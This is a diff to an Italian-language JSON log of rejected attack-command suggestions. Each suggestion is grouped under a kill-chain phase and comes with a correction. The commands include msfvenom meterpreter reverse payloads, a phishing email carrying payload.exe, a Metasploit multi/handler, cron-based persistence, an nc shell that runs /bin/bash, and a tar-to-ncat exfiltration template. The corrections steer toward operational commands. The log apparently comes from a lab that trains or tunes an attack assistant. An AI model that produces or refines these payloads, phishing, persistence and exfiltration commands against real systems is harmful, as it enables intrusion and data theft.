@@ -136,5 +136,125 @@
     "suggerimento_errato": "`sendEmail -f noreply@attacker.local -t info@shopcorp.local -u \"Test Email\" -m \"attachment: payload.exe\" -s smtp.attacker.local`",
     "motivo": "Il comando non allega realmente il file 'payload.exe', ma inserisce solo il testo 'attachment: payload.exe' nel corpo del messaggio. Per inviare un vero allegato con sendEmail devi usare l'opzione '-a payload.exe'.",
     "timestamp": "2025-07-04T16:38:08.432206"
+  },
+  {
+    "fase": "weaponization",
+    "suggerimento_errato": "`msfvenom -p php/meterpreter_reverse_http -o payload.php`",
+    "motivo": "Il comando è incompleto: mancano i parametri LHOST e LPORT, fondamentali per un payload reverse perché definiscono dove deve connettersi una volta eseguito.",
+    "timestamp": "2025-07-06T17:21:12.417904"
+  },
+  {
+    "fase": "weaponization",
+    "suggerimento_errato": "`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.1 LPORT=8080 -o payload.exe`",
+    "motivo": "Il comando è quasi corretto, ma manca l'opzione '-f exe' che specifica il formato eseguibile per Windows.",
+    "timestamp": "2025-07-07T22:01:01.829340"
+  },
+  {
+    "fase": "delivery",
+    "suggerimento_errato": "`sendEmail -f noreply@attacker.local -t info@shopcorp.local -u \"Phishing Email\" -m \"\" -a payload.exe -s smtp.attacker.local`",
+    "motivo": "Manca la porta nel parametro -s. Scrivi il server SMTP come smtp.attacker.local:25",
+    "timestamp": "2025-07-07T22:52:39.630039"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "`msfconsole`",
+    "motivo": "Il comando è troppo generico. In questa fase devi proporre un comando che esegua davvero un exploit specifico o un attacco concreto (ad esempio un modulo di Metasploit già parametrizzato o uno strumento che lanci un attacco reale).",
+    "timestamp": "2025-07-07T23:11:39.922369"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "`msfconsole -q -x run payload/reverse_tcp/payload.exe`",
+    "motivo": "La sintassi non è corretta: il comando non corrisponde a un modulo reale di Metasploit e non esegue nessun exploit. In questa fase dovresti suggerire un comando che avvia un modulo exploit valido, imposta i parametri richiesti (come PAYLOAD, LHOST, LPORT) e lancia l'exploit in modo operativo.",
+    "timestamp": "2025-07-07T23:13:53.687485"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "`use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.2.1; set LPORT 8080; exploit`",
+    "motivo": "Manca il comando iniziale per avviare msfconsole dalla shell (msfconsole -q -x )",
+    "timestamp": "2025-07-07T23:17:20.978610"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "`srvcons -s 10.0.2.1:8080 -q`",
+    "motivo": "non è tra i tool consentiti",
+    "timestamp": "2025-07-07T23:18:13.928855"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "`serve -q -p 8080 -l 10.0.2.1`",
+    "motivo": "non è tra i tool consentiti",
+    "timestamp": "2025-07-07T23:21:50.166549"
+  },
+  {
+    "fase": "exploit",
+    "suggerimento_errato": "`use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.2.1; set LPORT 8080; exploit`",
+    "motivo": "manca la parte iniziale `msfconsole -q -x'",
+    "timestamp": "2025-07-07T23:23:58.991529"
+  },
+  {
+    "fase": "installation",
+    "suggerimento_errato": "`sudo mseterp -a`",
+    "motivo": "non è tra i tool consentiti",
+    "timestamp": "2025-07-08T00:27:11.981736"
+  },
+  {
+    "fase": "installation",
+    "suggerimento_errato": "`sudo python -c 'import pty; pty.openPTY()' | meterpreter -x inject all -t /dev/ptmx'",
+    "motivo": "non è tra i tool consentiti",
+    "timestamp": "2025-07-08T00:30:13.905932"
+  },
+  {
+    "fase": "installation",
+    "suggerimento_errato": "`meterpreter shell -i'",
+    "motivo": "non è tra i tool consentiti",
+    "timestamp": "2025-07-08T00:34:47.286626"
+  },
+  {
+    "fase": "installation",
+    "suggerimento_errato": "`sudo msf5 meterpreter > backdoor -p > /etc/cron.d/malware_cron'",
+    "motivo": "non devi usare meterpreter, devi usare i tool consentiti",
+    "timestamp": "2025-07-08T00:35:53.442669"
+  },
+  {
+    "fase": "installation",
+    "suggerimento_errato": "`sudo crontab -l -e`",
+    "motivo": "NON usare sudo crontab -l -e perché non produce persistenza: usa invece un comando che aggiunge il payload al cron per l’avvio automatico.",
+    "timestamp": "2025-07-08T00:38:46.601848"
+  },
+  {
+    "fase": "actions_on_objectives",
+    "suggerimento_errato": "`tar -cf /root/exfiltrated_data./* | ncat --ssl --pipe`",
+    "motivo": "La sintassi è errata: il percorso dei file contiene un errore (/root/exfiltrated_data./*), manca l’indicazione di destinazione (IP e porta) per ncat, e il parametro --pipe non serve in questo contesto.\nPer esfiltrare dati in modo corretto con tar e ncat usa:\ntar -czf - /root/exfiltrated_data/* | ncat --ssl <IP_DESTINAZIONE> <PORTA>",
+    "timestamp": "2025-07-08T01:10:16.530473"
+  },
+  {
+    "fase": "weaponization",
+    "suggerimento_errato": "`msfvenom -p html/meterpreter_reverse_https -o payload.html -f html LHOST=10.0.2.1 LPORT=443`",
+    "motivo": "NON usare questo comando perché il payload html/meterpreter_reverse_https non esiste proprio in Metasploit, e i parametri sono nell’ordine sbagliato.\nInoltre, il flag -f html non è valido e l’opzione -o è usata in modo non standard.",
+    "timestamp": "2025-07-08T20:33:50.852209"
+  },
+  {
+    "fase": "command_and_control",
+    "suggerimento_errato": "`nc -l -v -e /bin/bash -lp 443`",
+    "motivo": "è sbagliata la sintassi. Quella corretta sarebbe: nc -l -p 443 -e /bin/bash -v",
+    "timestamp": "2025-07-08T21:51:31.673268"
+  },
+  {
+    "fase": "command_and_control",
+    "suggerimento_errato": "`nc -l -p 443 --ssl --keep-open`",
+    "motivo": "nc NON supporta --ssl né --keep-open",
+    "timestamp": "2025-07-08T21:53:16.106314"
+  },
+  {
+    "fase": "command_and_control",
+    "suggerimento_errato": "`ncat --ssl --keep-open -l -p 443`",
+    "motivo": "il parametro \"-p\" non serve",
+    "timestamp": "2025-07-08T21:59:47.323224"
+  },
+  {
+    "fase": "command_and_control",
+    "suggerimento_errato": "`ncat --ssl --keep-open -l -p 443 -v`",
+    "motivo": "non devono esserci i parametri \"-p\" e \"-v\"",
+    "timestamp": "2025-07-08T22:01:23.170299"
   }
 ]
